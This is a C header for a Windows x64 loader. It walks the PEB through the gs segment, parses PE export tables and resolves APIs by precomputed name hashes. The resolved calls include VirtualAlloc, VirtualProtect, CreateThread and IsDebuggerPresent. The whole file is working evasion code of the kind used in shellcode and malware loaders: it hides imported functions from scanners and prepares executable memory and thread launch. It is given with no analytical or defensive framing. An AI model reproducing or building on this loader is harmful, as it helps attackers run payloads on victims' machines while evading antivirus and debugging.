#ifndef LDR_H
#define LDR_H

//types

typedef unsigned long   DWORD;
typedef unsigned short  WORD;
typedef unsigned char   BYTE;
typedef unsigned int    UINT;
typedef unsigned long long SIZE_T;
typedef long            NTSTATUS;
typedef int             BOOL;

typedef void* HANDLE;
typedef void* LPVOID;
typedef const void* LPCVOID;
typedef void* LPSECURITY_ATTRIBUTES;
typedef DWORD* LPDWORD;

/* Offset IMAGE_DATA_DIRECTORY[0] inside IMAGE_OPTIONAL_HEADER64 */
#define LDR_PE_DATADIR_EXPORT_OFF 112


// PEB / LDR


typedef struct _LIST_ENTRY {
    struct _LIST_ENTRY* Flink;
    struct _LIST_ENTRY* Blink;
} LIST_ENTRY, *PLIST_ENTRY;

typedef struct _PEB_LDR_DATA {
    BYTE       Reserved1[8];
    void*      Reserved2[3];
    LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InMemoryOrderLinks;
    void*      Reserved2[2];
    void*      DllBase;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
    BYTE          Reserved1[2];
    BYTE          BeingDebugged;
    BYTE          Reserved2[1];
    BYTE          PaddingBeforeMutant[4];
    void*         Reserved3[2];
    PPEB_LDR_DATA Ldr;
} PEB, *PPEB;

typedef struct _IMAGE_EXPORT_DIRECTORY {
    DWORD Characteristics;
    DWORD TimeDateStamp;
    WORD  MajorVersion;
    WORD  MinorVersion;
    DWORD Name;
    DWORD Base;
    DWORD NumberOfFunctions;
    DWORD NumberOfNames;
    DWORD AddressOfFunctions;
    DWORD AddressOfNames;
    DWORD AddressOfNameOrdinals;
} IMAGE_EXPORT_DIRECTORY;


// function pointer


typedef DWORD (*LPTHREAD_START_ROUTINE)(void* lpParam);

typedef BOOL     (*FN_CloseHandle)(HANDLE hObject);
typedef HANDLE   (*FN_CreateThread)(
    LPSECURITY_ATTRIBUTES  lpThreadAttributes,
    SIZE_T                 dwStackSize,
    LPTHREAD_START_ROUTINE lpStartAddress,
    LPVOID                 lpParameter,
    DWORD                  dwCreationFlags,
    LPDWORD                lpThreadId
);
typedef void     (*FN_ExitProcess)(UINT uExitCode);
typedef BOOL     (*FN_FlushInstructionCache)(
    HANDLE hProcess, LPCVOID lpBaseAddress, SIZE_T dwSize
);
typedef BOOL     (*FN_GetExitCodeThread)(HANDLE hThread, LPDWORD lpExitCode);
typedef BOOL     (*FN_IsDebuggerPresent)(void);
typedef NTSTATUS (*FN_RtlMoveMemory)(void* dst, const void* src, SIZE_T len);
typedef LPVOID   (*FN_VirtualAlloc)(
    LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect
);
typedef BOOL     (*FN_VirtualFree)(
    LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType
);
typedef BOOL     (*FN_VirtualProtect)(
    LPVOID lpAddress, SIZE_T dwSize, DWORD flNewProtect, LPDWORD lpflOldProtect
);
typedef DWORD    (*FN_WaitForSingleObject)(HANDLE hHandle, DWORD dwMilliseconds);


/* contants                                                                 */

#define MEM_COMMIT_RESERVE  0x3000u
#define MEM_RELEASE         0x8000u
#define PAGE_READWRITE      0x04u
#define PAGE_EXEC_READ      0x20u
#define INFINITE            0xFFFFFFFFu

// export hashes (api_hash).
#define HASH_CLOSEHANDLE            0x47BDD9CB
#define HASH_CREATETHREAD           0x8DF92F7B
#define HASH_EXITPROCESS            0x9F19C67C
#define HASH_FLUSHINSTRUCTIONCACHE  0x3CC05103
#define HASH_GETEXITCODETHREAD      0xE31ACE56
#define HASH_ISDEBUGGERPRESENT      0x0EF4ED1B
#define HASH_RTLMOVEMEMORY          0x35C28707
#define HASH_VIRTUALALLOC           0x5AE0DABF
#define HASH_VIRTUALFREE            0x640675A2
#define HASH_VIRTUALPROTECT         0x927857D9
#define HASH_WAITFORSINGLEOBJECT    0x93397566


// inline helpers                                                           


static inline __attribute__((always_inline))
PPEB ldr_get_peb(void)
{
    PPEB peb;
    __asm__ __volatile__("movq %%gs:0x60, %0" : "=r"(peb));
    return peb;
}

static inline __attribute__((always_inline))
DWORD api_hash(const char* s)
{
    if (!s || !*s)
        return 0;
    DWORD h = 0x35;
    while (*s)
        h = h * 0xAB10F29F + (unsigned char)*s++;
    return h;
}

static inline __attribute__((always_inline))
void* ldr_find_export_by_hash(BYTE* base, DWORD target)
{
    if (!base || *(WORD*)base != 0x5A4D)
        return 0;

    DWORD e_lfanew = *(DWORD*)(base + 0x3C);
    if (*(DWORD*)(base + e_lfanew) != 0x00004550)
        return 0;

    DWORD exp_rva = *(DWORD*)(base + e_lfanew + 4 + 20 + LDR_PE_DATADIR_EXPORT_OFF);
    if (!exp_rva)
        return 0;

    IMAGE_EXPORT_DIRECTORY* exp = (IMAGE_EXPORT_DIRECTORY*)(base + exp_rva);
    DWORD* names = (DWORD*)(base + exp->AddressOfNames);
    WORD*  ords  = (WORD*)(base + exp->AddressOfNameOrdinals);
    DWORD* funcs = (DWORD*)(base + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char* name = (char*)(base + names[i]);
        if (name && *name && api_hash(name) == target)
            return (void*)(base + funcs[ords[i]]);
    }
    return 0;
}

static inline __attribute__((always_inline))
void* ldr_get_by_hash(DWORD target, void** out_base)
{
    PPEB peb = ldr_get_peb();
    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    PLDR_DATA_TABLE_ENTRY node = (PLDR_DATA_TABLE_ENTRY)head->Flink;

    while ((PLIST_ENTRY)node != head) {
        void* fn = ldr_find_export_by_hash((BYTE*)node->DllBase, target);
        if (fn) {
            if (out_base)
                *out_base = node->DllBase;
            return fn;
        }
        node = (PLDR_DATA_TABLE_ENTRY)node->InMemoryOrderLinks.Flink;
    }
    return 0;
}

#endif
